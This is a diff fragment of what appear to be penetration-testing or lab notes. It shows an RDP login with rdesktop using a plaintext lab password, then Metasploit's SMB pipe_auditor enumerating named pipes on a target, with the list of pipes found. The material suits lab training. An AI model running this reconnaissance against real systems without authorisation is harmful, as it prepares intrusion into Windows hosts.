@@ -12,3 +12,13 @@ once the user is created you can logged in to the system using rdesktop
  password: fadf24as
 
 rdesktop -u John -p fadf24as <target_ip>
+
+How to find the pipe
+
+msfconsole
+#use auxiliary/scanner/smb/pipe_auditor
+#set rhosts <target_ip>
+#run
+
+Result
+Pipes: \netlogon, \lsarpc, \samr, \browser, \atsvc, \epmapper, \eventlog, \InitShutdown, \lsass, \ntsvcs, \router, \scerpc, \srvsvc, \tapsrv, \wkssvc
